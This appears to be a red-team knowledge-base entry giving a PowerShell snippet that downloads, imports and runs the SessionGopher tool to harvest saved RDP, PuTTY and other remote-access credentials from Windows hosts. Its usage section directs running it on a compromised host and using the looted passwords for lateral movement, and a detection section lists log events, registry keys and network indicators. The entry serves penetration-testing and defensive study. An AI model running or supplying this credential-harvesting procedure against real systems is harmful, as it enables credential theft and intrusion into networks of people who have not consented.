---
id: 03a4c7a8-acec-4c43-a81e-1740ddf42070
name: PowerShell-Script-to-Invoke-SessionGopher
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:29.228602+00:00'
updated_at: '2023-04-10T20:37:49.279099+00:00'
platforms:
  - Windows
tags:
  - credential-access
  - post-exploitation
validated: true
---

# PowerShell-Script-to-Invoke-SessionGopher

## Code

```powershell
https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Description

This PowerShell code snippet downloads (via URL reference), imports, and invokes the SessionGopher module to extract saved remote access credentials from Windows applications. It demonstrates both unauthenticated and authenticated enumeration modes, producing XML output with looted passwords for privilege escalation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| path\to\SessionGopher.ps1 | Local path to the imported module file | C:\Temp\SessionGopher.ps1 |
| domain.com\adm-arvanaghi | Domain username for authenticated run | contoso\admin |
| s3cr3tP@ss | Password for authentication | P@ssw0rd123 |
| -o | Output filename (appended if not specified) | SessionGopher-Output.xml |

## Usage

Execute this in a PowerShell session on a compromised Windows host after gaining initial access. First, download the script using the referenced URL (e.g., via Invoke-WebRequest), then run the import and invoke lines. Use the output XML to identify and test stolen credentials for lateral movement, such as RDP to other systems. Ideal for red team exercises targeting user workstations with saved sessions.

## Detection

- PowerShell ScriptBlock logging (Event ID 4104) capturing module imports and Invoke-SessionGopher calls.
- Network connections to GitHub raw.githubusercontent.com domains from unusual hosts.
- File creation of SessionGopher.ps1 or XML outputs in temp directories.
- Anomalous access to registry keys (e.g., HKCU\Software\SimonTatham\PuTTY\Sessions) or app data folders.
- EDR alerts on credential dumping behaviors or unsigned script execution.

## Related

- [[procedures/Windows-Privilege-Escalation-EoP-Looting-for-Passwords-with-SessionGopher]]
- [[tools/SessionGopher]]
